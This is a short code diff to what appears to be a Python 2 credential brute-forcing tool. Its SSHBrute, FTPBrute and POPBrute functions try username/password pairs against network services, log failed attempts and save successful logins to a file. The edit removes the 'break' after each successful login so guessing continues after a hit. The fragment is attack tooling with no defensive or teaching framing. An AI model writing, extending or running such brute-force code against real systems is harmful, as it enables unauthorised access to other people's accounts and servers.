@@ -13,6 +13,7 @@ def log(msg):
 def generateAuthPair():
 	return (str(uuid.uuid4()), str(uuid.uuid4()))
 
+
 def SSHBrute(host, port):
 	attempts = 80
 	scancurrentline = 0
@@ -48,7 +49,6 @@ def SSHBrute(host, port):
 			outfile.write(login + '\n')
 			outfile.close()
 			client.close()
-			break
 		except paramiko.AuthenticationException, error:
 			print log("Incorrect credentials User: %s and Password: %s" % (tstusername, tstpassword))
 			continue
@@ -105,7 +105,6 @@ def FTPBrute(host, port):
 			outfile.write(login + '\n')
 			outfile.close()
 			ftpclient.close()
-			break
 		except socket.timeout:
 			print log("Connection Timeout")
 			break
@@ -160,7 +159,6 @@ def POPBrute(host, port):
 			outfile.write(login + '\n')
 			outfile.close()
 			client.quit()
-			break
 		except socket.timeout:
 			print log("Connection Timeout")
 			break
